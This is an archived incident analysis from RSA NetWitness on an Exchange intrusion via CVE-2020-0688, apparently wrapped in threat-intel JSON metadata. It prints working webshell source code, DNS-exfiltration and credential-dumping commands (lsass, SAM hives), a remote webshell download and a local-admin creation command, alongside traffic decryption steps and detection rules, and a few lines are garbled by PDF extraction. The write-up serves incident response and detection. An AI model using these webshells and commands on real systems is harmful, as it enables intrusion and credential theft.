{
    "id": "d36bf239-cdb9-4685-9d71-0ed9e0ecf60c",
    "created_at": "2023-01-12T14:59:49.459159Z",
    "updated_at": "2025-03-27T02:08:40.286005Z",
    "deleted_at": null,
    "sha1_hash": "7553eab503e0882240e7da884a1fa20a763d89bd",
    "title": "2020-03-24 - Exchange Exploit Case Study – CVE-2020-0688",
    "authors": "",
    "file_creation_date": "2022-05-27T21:45:30Z",
    "file_modification_date": "2022-05-27T21:45:30Z",
    "file_size": 2792329,
    "plain_text": "# Exchange Exploit Case Study – CVE-2020-0688\n\n**[community.rsa.com/community/products/netwitness/blog/2020/03/24/exchange-exploit-case-study-cve-2020-0688](https://community.rsa.com/community/products/netwitness/blog/2020/03/24/exchange-exploit-case-study-cve-2020-0688)**\n\n## Abstract\n\n\nMarch 24, 2020\n\n\nIn this blog I describe a recent intrusion that started with the exploit of CVE-2020-0688. Microsoft released a patch for this vulnerability on 11\nFebruary 2020. In order for this exploit to work, an authenticated account is needed to be able to make requests against the Exchange Control\nPanel (ECP). Some organizations may still have not patched for this vulnerability for various reasons, such as prolonged change request\nprocedures. One false sense of \"comfort\" for delaying this patch for some organizations could be the fact that an authenticated account is\nneeded to execute the exploit. However, harvesting a set of credentials from an organization is typically fairly easy, either via a credential\nharvesting email, or via a simple dictionary attack against the exchange server. Details on the technical aspects of this exploit have been\nwidely described on various sites. So, in this blog I will briefly describe the exploit artifacts, and then jump into the actual activity that followed\nthe exploit, including an interesting webshell that utilizes pipes for command execution. I will then describe how to decrypt the communication\nover this webshell. Finally, I will highlight some of the detection mechanisms that are native to the Netwitness Platform that will alert your\norganization to such activity.\n\n## Exchange Exploit - CVE-2020-0688\n\nThe first sign of the exploit started on 26 February 2020. The attacker leveraged the credentials of an account it had already compromised to\nauthenticate to OWA. An attacker could acquire such accounts either by guessing passwords due to poor password policy, or by preceding the\nexploit with a credential harvesting attack. Once the at least one set of credentials has been acquired, the attacker can start to\nissue commands via the exploit against ECP. The IIS logs contain these commands, and they can be easily decoded via a two-step process:\nURL Decode -> Base64 Decode.\n\nThe following Cyberchef recipe helps us decode the highlighted exploit code:\n\n[https://gchq.github.io/CyberChef/#recipe=URL_Decode()From_Base64('A-Za-z0-9%2B/%3D',true)](https://gchq.github.io/CyberChef/#recipe=URL_Decode()From_Base64('A-Za-z0-9%2B/%3D',true)\n\nThe highlighted encoded data above decodes to the following where we see the attacker attempt to echo the string 'flogon' into a file named\nflogon2.js in one of the public facing Exchange folders:\n\n\n-----\n\ne attac e pe o ed t o o e e p o t success c ec s by au c g a tp co a d to a o y ous y og to add ess 85 5 5,\nfollowed by a ping request to a Burp Collaborator domain:\n\nThe attacker returned on 29 February 2020 to attempt to establish persistence on the Exchange servers (multiple servers were load balanced).\nThe exploit commands once again started with pings to Burp Collaborator domains and FTP connection attempts to IP address 185.25.51.71\nto ensure that the server was still exploitable. These were followed up by commands to write simple strings into files in the Exchange\ndirectories, as shown below:\n\nThe attacker also attempted to create a local user account named “public” with password “Asp-=14789’’ via the exploit, and attempted to add\nthis account to the local administrators group. These two actions failed.\n\n**Attacker commands**\n```\n cmd /c net user public Asp-=14789 /add\n cmd /c net localgroup administrators public\n /add \n\n```\nThe attacker issued several ping requests to subdomains under zhack.ca, which is a site that can be freely used to test data exfiltration over\nDNS. In these commands, the DNS resolution itself is what enables the sending of data to the attacker. Again, the attacker appears to have\nbeen trying to see if the exploit commands were successful, and these DNS requests would have confirmed the success of the exploit\ncommands.\n\nHere is what the attacker would have seen if the requests were successful:\n\nHere are some of the generic domain names the attacker tried:\n\n**zhack.ca pings**\n\n\n-----\n\n**zhack.ca pings**\n```\n ping –n 1 asd.ddb8d339493dc0834c6f.d.zhack.ca\n ping –n 1\n mydatahere.9234b19e99d260b486b5.d.zhack.ca\n ping –n 1\n asasdd.ddb8d339493dc0834c6f.d.zhack.ca \n\n```\nAfter confirming that the DNS requests were being made, the attacker then started concatenating the output of Powershell commands to these\nDNS requests in order to see the result of the commands. It is worth mentioning here that at this point the attacker was still executing\ncommands via the exploit, and while the commands did execute, the attacker did not have a way to see the results of such attempts. Hence,\ninitially the attacker wrote some output to files as shown above (such as flogon2.txt), or in this case sending the output of the commands via\nDNS lookups. So, for example, the attacker tried commands such as:\n\n**Concatenating Powershell command results to DNS queries**\n```\n powershell Resolve-DnsName((test-netconnection google.com -port 443-informationlevel\n quiet).toString()+'.1.0d7a5e6cf01310fe3fd5.d.zhack.ca')\n powershell Resolve-DnsName((test-path 'c:\\program files\\microsoft\\exchange\n server\\v15\\frontend\\httpproxy\\owa\\auth').toString()+$env:computername+'.2.0d7a5e6cf01310fe3fd5.d.zhack.ca')\n\n```\nThese types of request would have confirmed that the server is allowed to connect outbound to the Internet (by being able to reach\ngoogle.com), test the existence of the specified path, and sent the hostname to the attacker.\n\n## Entrenchment\n\nOnce the attacker confirmed that the server(s) could reach the Internet and verified the Exchange path, he/she issued a command via the\nexploit to download a webshell hosted at pastebin into this directory under a file named OutlookDN.aspx (I am redacting the full pastebin link to\nprevent the hijacking of such webshells on other potential victims by other actors, since the webshell is password protected):\n\n**Webshell Upload via Exploit**\n```\n powershell (New-Object System.Net.WebClient).DownloadFile('http://pastebin.com/raw/**REDACTED**','C:\\Program\n Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\OutlookDN.aspx')\n\n```\nThe webshell code downloaded from pastebin is shown below:\n\n**Content of OutlookDN.aspx webshell**\n\n\n-----\n\n**Content of OutlookDN.aspx webshell**\n```\n <%@ Page Language=\"C#\" AutoEventWireup=\"true\" %>\n <%@ Import Namespace=\"System.Runtime.InteropServices\" %>\n <%@ Import Namespace=\"System.IO\" %>\n <%@ Import Namespace=\"System.Data\" %>\n <%@ Import Namespace=\"System.Reflection\" %>\n <%@ Import Namespace=\"System.Diagnostics\" %>\n <%@ Import Namespace=\"System.Web\" %>\n <%@ Import Namespace=\"System.Web.UI\" %>\n <%@ Import Namespace=\"System.Web.UI.WebControls\" %>\n <form id=\"form1\" runat=\"server\">\n <asp:TextBox id=\"cmd\" runat=\"server\" Text=\"whoami\" />\n <asp:Button id=\"btn\" onclick=\"exec\" runat=\"server\" Text=\"execute\"\n />\n </form>\n <script runat=\"server\">\n protected void exec(object sender, EventArgs e)\n {\n  Process p = new Process();\n p.StartInfo.FileName = \"cmd\";\n p.StartInfo.Arguments = \"/c \" + cmd.Text;\n p.StartInfo.UseShellExecute = false;\n p.StartInfo.RedirectStandardOutput = true;\n p.StartInfo.RedirectStandardError = true;\n p.Start();\n Response.Write(\"<pre>\\r\\n\"+p.StandardOutput.ReadToEnd()\n +\"\\r\\n</pre>\");\n p.Close();\n }\n  protected void Page_Load(object sender, EventArgs e)\n {\n if (Request.Params[\"pw\"]!=\"*******REDACTED********\")\n Response.End();\n }\n </script>\n\n```\nAt this point the exploit was no longer necessary since this webshell was now directly accessible and the results of the commands were\ndisplayed back to the attacker. The attacker proceeded to execute commands via this webshell and upload other webshells from this point\nforward. One of the other uploaded webshells is shown below:\n\n**Webshell 2**\n```\n powershell [System.IO.File]::WriteAllText('c:\\program files\\microsoft\\exchange server\\v15\\frontend\\httpproxy\\owa\\auth\\a.aspx',\n [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiU+PCVTeXN0ZW0uSU8uRmlsZS5Xcml\n\n```\nThe webshell code decoded from above is:\n```\n <%@ Page Language=\"C#\"%><%System.IO.File.WriteAllBytes(Request[\"p\"],Convert.FromBase64String(Request.Cookies[\"c\"].Value));%>\n\n```\nAt this point the attacker performed some of the most common activities that attackers perform during the early stages of the compromise.\nNamely, credential harvesting, user and group lookups, some pings and directory traversals.\n\nThe credential harvesting consisted of several common techniques:\n\n**Credential harvesting related activity**\n\nUsed SysInternal’s ProcDump (pr.exe) to dump the lsass.exe process memory:\n```\n cmd.exe /c pr.exe -accepteula -ma lsass.exe lsasp \n\n```\nUsed the comsvcs.dll technique to dump the lsass.exe process memory:\n```\n cmd /c tasklist | findstr lsass.exe\n cmd.exe /c rundll32.exe c:\\windows\\system32\\comsvcs.dll, Minidump 944 c:\\windows\\temp\\temp.dmp full \n\n```\nObtained copies of the SAM and SYSTEM hives for the purpose of harvesting local account password hashes.\n\nThese files were then placed on public facing exchange folders and downloaded directly from the Internet:\n```\n cmd /c copy c:\\windows\\system32\\inetsrv\\system\n \"C:\\Program Files\\Microsoft\\Exchange Server\\V15\\ClientAccess\\ecp\\system.js\"\n cmd /c copy c:\\windows\\system32\\inetsrv\\sam\n \"C:\\Program Files\\Microsoft\\Exchange Server\\V15\\ClientAccess\\ecp\\sam.js\"\n\n```\n\n-----\n\nadd t o to t e t ad t o a S type ebs e s, t e attac e t oduced a ot e type o ebs e to t e c a ge se e s o es e e\nuploaded under the c:\\windows\\temp\\ folder to setup this new backdoor:\n```\nC:\\windows\\temp\\System.Web.TransportClient.dll\nC:\\windows\\temp\\tmp.ps1 \n\n```\nFile System.Web.TransportClient.dll is webshell, whereas file tmp.ps1 is a script to register this DLL with IIS. The content of this script are\nshown below:\n```\n[System.Reflection.Assembly]::Load(\"System.EnterpriseServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\") \n$publish = New-Object System.EnterpriseServices.Internal.Publish\n$name = (gi C:\\Windows\\Temp\\System.Web.TransportClient.dll).FullName\n$publish.GacInstall($name)\n$type = \"System.Web.TransportClient.TransportHandlerModule, \" + [System.Reflection.AssemblyName]::GetAssemblyName($name).FullName\nc:\\windows\\system32\\inetsrv\\Appcmd.exe add module /name:TransportModule /type:\"$type\"\n\n```\nThe decompiled code of the DLL is shown below (I am only showing part of the AES encryption key, to once again prevent the hijacking of\nsuch a webshell):\n\n\n-----\n\n```\nusing System.IO;\nusing System.IO.Pipes;\nusing System.Security.Cryptography;\nusing System.Text;\nnamespace System.Web.TransportClient\n{\n public class TransportHandlerModule : IHttpModule\n {\n public void Init(HttpApplication application)\n {\n application.BeginRequest += new EventHandler(this.Application_EndRequest);\n }\nprivate void Application_EndRequest(object source, EventArgs e)\n {\n HttpContext context = ((HttpApplication) source).Context;\n HttpRequest request = context.Request;\n HttpResponse response = context.Response;\n string keyString = \"kByTsFZq********nTzuZDVs********\";\n string cipherData1 = request.Params[keyString.Substring(0, 8)];\n string cipherData2 = request.Params[keyString.Substring(16, 8)];\n if (cipherData1 != null)\n {\n response.ContentType = \"text/plain\";\n string plain;\n try\n {\n string command = TransportHandlerModule.Decrypt(cipherData1, keyString);\n plain = cipherData2 != null ? TransportHandlerModule.Client(command, TransportHandlerModule.Decrypt(cipherData2, keyString)) :\nTransportHandlerModule.run(command);\n }\n catch (Exception ex)\n {\n plain = \"error:\" + ex.Message + \" \" + ex.StackTrace;\n }\n response.Write(TransportHandlerModule.Encrypt(plain, keyString));\n response.End();\n }\n else\n context.Response.DisableKernelCache();\n }\nprivate static string Encrypt(string plain, string keyString)\n {\n byte[] bytes1 = Encoding.UTF8.GetBytes(keyString);\n byte[] salt = new byte[10]\n {\n (byte) 1,\n (byte) 2,\n (byte) 23,\n (byte) 234,\n (byte) 37,\n (byte) 48,\n (byte) 134,\n (byte) 63,\n (byte) 248,\n (byte) 4\n };\n byte[] bytes2 = new Rfc2898DeriveBytes(keyString, salt).GetBytes(16);\n RijndaelManaged rijndaelManaged1 = new RijndaelManaged();\n rijndaelManaged1.Key = bytes1;\n rijndaelManaged1.IV = bytes2;\n rijndaelManaged1.Mode = CipherMode.CBC;\n using (RijndaelManaged rijndaelManaged2 = rijndaelManaged1)\n {\n using (MemoryStream memoryStream = new MemoryStream())\n {\n using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged2.CreateEncryptor(bytes1, bytes2),\nCryptoStreamMode.Write))\n {\n byte[] bytes3 = Encoding.UTF8.GetBytes(plain);\n memoryStream.Write(bytes2, 0, bytes2.Length);\n cryptoStream.Write(bytes3, 0, bytes3.Length);\n cryptoStream.Close();\n return Convert.ToBase64String(memoryStream.ToArray());\n }\n }\n }\n }\nprivate static string Decrypt(string cipherData, string keyString)\n {\n byte[] bytes = Encoding.UTF8.GetBytes(keyString);\n byte[] buffer = Convert.FromBase64String(cipherData);\n byte[] rgbIV = new byte[16];\n\n```\n\n-----\n\n```\n RijndaelManaged rijndaelManaged1 = new RijndaelManaged();\n rijndaelManaged1.Key = bytes;\n rijndaelManaged1.IV = rgbIV;\n rijndaelManaged1.Mode = CipherMode.CBC;\n using (RijndaelManaged rijndaelManaged2 = rijndaelManaged1)\n {\n using (MemoryStream memoryStream = new MemoryStream(buffer, 16, buffer.Length - 16))\n {\n using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged2.CreateDecryptor(bytes, rgbIV),\nCryptoStreamMode.Read))\n return new StreamReader((Stream) cryptoStream).ReadToEnd();\n }\n }\n }\nprivate static string run(string command)\n {\n string str = \"/c \" + command;\n Process process = new Process();\n process.StartInfo.FileName = \"cmd.exe\";\n process.StartInfo.Arguments = str;\n process.StartInfo.UseShellExecute = false;\n process.StartInfo.RedirectStandardOutput = true;\n process.Start();\n return process.StandardOutput.ReadToEnd();\n }\nprivate static string Client(string command, string path)\n {\n string pipeName = \"splsvc\";\n string serverName = \".\";\n Console.WriteLine(\"sending to : \" + serverName + \", path = \" + path);\n using (NamedPipeClientStream pipeClientStream = new NamedPipeClientStream(serverName, pipeName))\n {\n pipeClientStream.Connect(1500);\n StreamWriter streamWriter = new StreamWriter((Stream) pipeClientStream);\n streamWriter.WriteLine(path);\n streamWriter.WriteLine(command);\n streamWriter.WriteLine(\"**end**\");\n streamWriter.Flush();\n return new StreamReader((Stream) pipeClientStream).ReadToEnd();\n }\n }\npublic void Dispose()\n {\n }\n }\n}\n\n```\nThe registered DLL shows up in the IIS Modules as TransportModule:\n\n\n-----\n\ns ebs e s capab e o e ecut g co a ds d ect y a c d e e, o se d t e co a d to a p pe a ed sp s c t s setup, t e\nDLL acts as the pipe client, i.e. it sends data to the named pipe. In order to setup the other side of the pipe (i.e. the server side of the pipe), the\nattacker executed this command:\n```\ncmd.exe /c WMIC /node:\".\" process call create \"powershell -enc\nJABzAGMAcgBpAHAAdAAgAD0AIAB7AAoACQAkAHAAaQBwAGUATgBhAG0AZQAgAD0AIAAnAHMAcABsAHMAdgBjACcACgAJACQAYwBtAGQAIAA9ACAARwBlAHQALQBXAG0AaQBP\n\n```\nThe encoded data in the Powershell command decodes to this script, which sets up the pipe server:\n```\n$script ={\n     $pipeName ='splsvc'\n     $cmd = Get-WmiObject Win32_Process -Filter \"handle = $pid\"| Select-Object -ExpandProperty commandline\n     $list = Get-WmiObject Win32_Process | Where-Object {$_.CommandLine -eq $cmd -and $_.Handle -ne $pid}\nif($list.length -ge 50){\n          $list | foreach-Object -process {stop-process -id $_.Handle}\n}\nfunctionhandleCommand(){\nwhile($true){\n              Write-Host \"create pipe server\"\n              $sid =new-object\nSystem.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::WorldSid, $Null)\n              $PipeSecurity =new-object System.IO.Pipes.PipeSecurity\n              $AccessRule = New-Object System.IO.Pipes.PipeAccessRule(\"Everyone\",\"FullControl\",\"Allow\")\n              $PipeSecurity.SetAccessRule($AccessRule)\n              $pipe =new-object System.IO.Pipes.NamedPipeServerStream $pipeName,'InOut',60,'Byte','None',32768,32768,\n$PipeSecurity\n              #$pipe =new-object System.IO.Pipes.NamedPipeServerStream $pipeName,'InOut',60\n              $pipe.WaitForConnection()\n              $reader =new-object System.IO.StreamReader($pipe);\n              $writer =new-object System.IO.StreamWriter($pipe);\n                                                $path = $reader.ReadLine();\n              $data = ''\n              while ($true) {\n                   $line = $reader.ReadLine()\n                   if ($line -eq '**end**') {\n                        break\n                   }\n                   $data += $line + [Environment]::NewLine\n              }\n              write-host $path\n              write-host $data\n              try {\n                   $parts = $path.Split(':')\n                   $index = [int]::Parse($parts[0])\n                   if ($index + 1 -eq $parts.Length) {\n                        $retval = iex $data | Out-String\n                   } else {\n                        $parts[0] = ($index + 1).ToString()\n                        $newPath = $parts -join ':'\n                        $retval = send $parts[$index + 1] $newPath $data\n                        Write-Host 'send to next' + $retval\n                   }\n              } catch {\n                   $retval = 'error:' + $env:computername + '>' + $path + '> ' + $Error[0].ToString()\n              }\n              Write-Host $retval\n              $writer.WriteLine($retval)\n              $writer.Flush()\n              $writer.Close()\n          }\n     }\n     function send($next, $path, $data) {\n          write-host 'next' + $next\n          write-host $path\n          $client = new-object System.IO.Pipes.NamedPipeClientStream $next, $pipeName, 'InOut', 'None', 'Anonymous'\n          $client.Connect(1000)\n          $writer = new-object System.IO.StreamWriter($client)\n          $writer.WriteLine($path)\n          $writer.WriteLine($data)\n          $writer.WriteLine('**end**')\n          $writer.Flush()\n          $reader = new-object System.IO.StreamReader($client);\n          $resp = $reader.ReadToEnd()\n          $resp\n     }\n     $ErrorActionPreference = 'Stop'\n     handleCommand\n}\nInvoke-Command -ScriptBlock $script\n\n```\n\n-----\n\no a pe spect e, t e te est g aspect o t s type o ebs e s t at ot e t a t e co a d to setup t e p pe se e, c s\nexecuted via the w3wp.exe process, the rest of the commands are executed via the Powershell command that sets up the pipe server, even\nthough the commands are coming through w3wp.exe process. In fact, once the attacker setup this type of webshell in this intrusion, he/she\ndeleted all of the initial ASPX based webshells.\n\nAlthough during this incident the pipe webshell was only used on the exchange server itself, it is possible to\n\n## Webshell Data Decryption\n\nIn order to communicate with this webshell, the attacker issued the commands via the /ews/exchange.asmx page. Lets break down the\ncommunication with this webshell and highlight some of the characteristics that make it unique. Here is a sample command:\n\n**Request**\n```\n POST /ews/exchange.asmx HTTP/1.1\n host: webmail.***************.com\n content-type: application/x-www-form-urlencoded\n content-length: 385\n Connection: close\n kByTsFZq=t52oDnptrTkTGLPlNYi6U2crOvyn5KhAC2MJegqJ2s5396NZ9ZFqEuN2RHAaaqePvg\n KuQ7X\n %2BPFePh0x3QNXbL9sMnyPkRcA3IvyGbPFbt89cwlmtuPLJdjmCZ%2FDNPacCBeG2PzLV70p2Q0\n vRiyO\n Xzi2NeEo6jcyc5iQAfOFCWPf90OjoEDruADkMgg18JV7hqtBWLsOF1caRW8%2BVcEj0Fii88I9z\n GYwjd\n %2F9Dv3TV4SFKxVvYeVJRr6lTHHO0RIJEGVU5Oa8F%2BkO%2BEQt%2FtS49h8J%2FpjTNShwZOA\n LoLUu\n B7Rc%3D&nTzuZDVs=SryqIaK3fpejyDoOdyf9b%2Fi7aBqPAzBL1SUROVuScbc%3D \n\n```\n**Response**\n```\n HTTP/1.1200 OK\n Content-Type: text/plain; charset=utf-8\n Server: Microsoft-IIS/8.5\n X-Powered-By: ASP.NET\n X-FEServer:***************\n Date: Sat,07 Mar 202008:10:43 GMT\n Content-Length:1606656\n 2QfeQaDxyIZD4JjRv7tj0XmEwYRrdN5wFMCj5ROF2vV/7y7WUPkH2S7ZASsoQpNgX7F+aMek0q72blHF\n kdKDQFwDVjPr9sBWR2grwHPsXENO2KFKle5i63TAOUzlHgs3LTwuGc/Md41r60l+5ke+xLhIKKXCHZTx\n nG9BRHgtefPlFR8BEzlJcWA5SOgo+n29DZjqjhBeenMqL+d+DNECKjXdji8IIr/AsvWoEkiwuv05K04E\n cJpjecIUzVKSkcgGmhCoijl5QEN8N32E//NkpfEgq/Rqsytf8xIwSDqUlTqObUwwq0BkOX79mI6WS5Zu\n 627Rf6z7SNyH+zHe0dEAcBAZDH2sEfyFUe2QQjK8J7M/QBU5vDGj***** REDACTED ******\n\n```\nThe request to /ews/exchange.asmx is done in lowercase. While there are a couple of email clients that exhibit that same behavior, they\ncould be quickly filtered out, especially when we see that the requests to this webshell do not even contain a user agent. We also notice that\nseveral of the other HTTP headers are in lowercase. Namely,\n\n**host: vs Host:**\n\n\n-----\n\n**co te t type** s Co te t **ype**\n\n**content-length: vs Content-Length:**\n\nThe actual command follows the HTTP headers. Lets break down this command:\n\nkByTsFZq=t52oDnptrTkTGLPlNYi6U2crOvyn5KhAC2MJegqJ2s5396NZ9ZFqEuN2RHAaaqePvgKuQ7X%2BPFePh0x3QNXbL9sMnyPkRcA3IvyG\n\nThe beginning of the payload contains part of the AES encryption key. Namely, in the decompiled code shown above we notice that the AES\nkey is: kByTsFZq********nTzuZDVs********\n\nThe data that follows the first 8 bytes of the key is shown below:\n\nt52oDnptrTkTGLPlNYi6U2crOvyn5KhAC2MJegqJ2s5396NZ9ZFqEuN2RHAaaqePvgKuQ7X%2BPFePh0x3QNXbL9sMnyPkRcA3IvyGbPFbt89cw\n\nLets decrypt this data step by step, and build a Cyberchef recipe to do the job for us:\n\nStep 1 - 3: The obfuscated data needs to be URL decoded, however, the + character is a legitimate Base64 character that is misinterpreted by\nthe URL decoder as a space. So, we first replace the + with a . (dot). The + character will not necessarily be in every chunk of Base64\nencoded data, but we need to account for it in order to build an error free recipe.\n\nStep 4 – 5: At this point we can Base64 decode the data. However, the data that we will get from this step is binary in nature, so we will\nconvert to ASCII hex as well, since we need to use part of it for the AES IV.\n\n\n-----\n\nStep 6 – 7: The first 32 bytes of ASCII hex (16 bytes raw) are the AES IV, so in these two steps we use the Register function of Cyberchef to\nstore these bytes in $R0, and then remove them with the Replace function:\n\nStep 8: Finally we can decrypt the data using the static AES key that we got from the decompiled code, and the dynamic IV value that we\nextracted from the decoded data.\n\nThe actual recipe is shown below:\n\n\n-----\n\n```\nZa-z09%2B/%3D',true)To_Hex('None',0)Register('(.%7B32%7D)',true,false,false)Find_/_Replace(%7B'option':'Regex','string':'.%7B32%7D(.*)'%7\n\n```\nWe use the same recipe to decode the second chunk of encoded data in the request\n(SryqIaK3fpejyDoOdyf9b%2Fi7aBqPAzBL1SUROVuScbc%3D), which ends up only decoding to the following:\n\nThe response does not contain any parts of the key, so we can just copy everything following the HTTP headers and decrypt with the same\nformula. Here is a partial view of the results of the command, which is just a file listing of the \\Windows\\temp folder:\n\n## NetWitness Platform - Detection\n\nThe malicious activity in this incident will be detected at multiple stages by NetWitness Endpoint from the exploit itself, to the webshell activity\nand subsequent commands executed via the webshells. The easiest way to detect webshell activity, regardless of its type, is to monitor any\nweb daemon processes (such as w3wp.exe) for uncommon behavior. Uncommon behavior for such processes primarily falls into three\ncategories:\n\n1. Web daemon process starting a shell process.\n2. Web daemon process creating (writing) executable files.\n3. Web daemon process launching uncommon processes (here you may have to filter out some processes based on your environment).\n\nThe NetWitness Endpoint 11.4 comes with various AppRules to detect webshell activity:\n\nThe process tree will also reveal the commands that are executed via the webshell in more detail:\n\n\n-----\n\nSeveral other AppRules detect the additional activity, such as:\n```\nPowerShell Double Base64\nRuns Powershell Using Encoded Command\nRuns Powershell Using Environment Variables\nRuns Powershell Downloading Content\nRuns Powershell With HTTP Argument\nCreates Local User Account \n\n```\nAs part of your daily hunting you should always also look at any Fileless_Scripts, which are common when encoded powershell commands are\nexecuted:\n\nFrom the NetWitness packet perspective such network traffic is typically encrypted unless SSL interception is already in place. RSA highly\nrecommends that such technology is deployed in your network to provide visibility into this type of traffic, which also makes up a substantial\namount of traffic in every network.\n\nOnce the traffic is decrypted, there are several aspects of this traffic that are grouped in typical hunting paths related to the HTTP protocol,\nsuch as HTTP with Base64, HTTP with no user agent, and several others shown below:\n\nThe webshell commands are found in the Query meta key:\n\n\n-----\n\no de to ag t e o e case equest to /e s/e c a ge as e eed to setup a custo co gu at o us g t e S C pa se,\nnormally disabled by default. We can do the same with the other lowercase headers, which are the characteristics we observed of whatever\nclient the attacker is using to interact with this webshell. In NWP we can quickly setup this in the search.ini file of your decoder. Any hits for\nthis string can then be referenced in AppRules by using this expression (found = 'Lowercase EWS'), and can be combined with other\nmetadata.\n\n## Conclusion\n\nThis incident demonstrates the importance of timely patching, especially when a working exploit is publicly available for a vulnerability.\nHowever, regardless of whether you are dealing with a known exploit or a 0-day, daily hunting and monitoring can always lead to early\ndetection and reduced attacker dwell time. The NetWitness Platform will provide your team with the necessary visibility to detect and\ninvestigate such breaches.\n\n[Special thanks to Rui Ataide and](https://community.rsa.com/rsa-users/11325) [Lee Kirkpatrick for their assistance with this case.](https://community.rsa.com/rsa-users/3028)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-03-24 - Exchange Exploit Case Study – CVE-2020-0688.pdf"
    ],
    "report_names": [
        "2020-03-24 - Exchange Exploit Case Study – CVE-2020-0688.pdf"
    ],
    "threat_actors": [
        {
            "id": "5d2bd376-fcdc-4c6a-bc2c-17ebbb5b81a4",
            "created_at": "2022-10-25T16:07:23.667223Z",
            "updated_at": "2025-03-27T02:02:09.916086Z",
            "deleted_at": null,
            "main_name": "GCHQ",
            "aliases": [
                "Government Communications Headquarters",
                "Operation Socialist"
            ],
            "source_name": "ETDA:GCHQ",
            "tools": [
                "Prax",
                "Regin",
                "WarriorPride"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "dc7ee503-9494-4fb6-a678-440c68fd31d8",
            "created_at": "2022-10-25T16:07:23.349177Z",
            "updated_at": "2025-03-27T02:02:09.748159Z",
            "deleted_at": null,
            "main_name": "APT 31",
            "aliases": [
                "APT 31",
                "Bronze Vinewood",
                "Judgment Panda",
                "Red Keres",
                "RedBravo",
                "TA412",
                "Violet Typhoon",
                "Zirconium"
            ],
            "source_name": "ETDA:APT 31",
            "tools": [
                "9002 RAT",
                "Agent.dhwf",
                "AngryRebel",
                "CHINACHOPPER",
                "China Chopper",
                "Destroy RAT",
                "DestroyRAT",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "GrewApacha",
                "HOMEUNIX",
                "HiKit",
                "HidraQ",
                "Homux",
                "Hydraq",
                "Kaba",
                "Korplug",
                "McRAT",
                "MdmBot",
                "Moudour",
                "Mydoor",
                "PCRat",
                "PlugX",
                "RedDelta",
                "Roarur",
                "Sakula",
                "Sakula RAT",
                "Sakurel",
                "SinoChopper",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Trochilus RAT",
                "Xamtrav"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535589,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1653687930,
    "ts_modification_date": 1653687930,
    "files": {
        "pdf": "https://archive.orkl.eu/7553eab503e0882240e7da884a1fa20a763d89bd.pdf",
        "text": "https://archive.orkl.eu/7553eab503e0882240e7da884a1fa20a763d89bd.txt",
        "img": "https://archive.orkl.eu/7553eab503e0882240e7da884a1fa20a763d89bd.jpg"
    }
}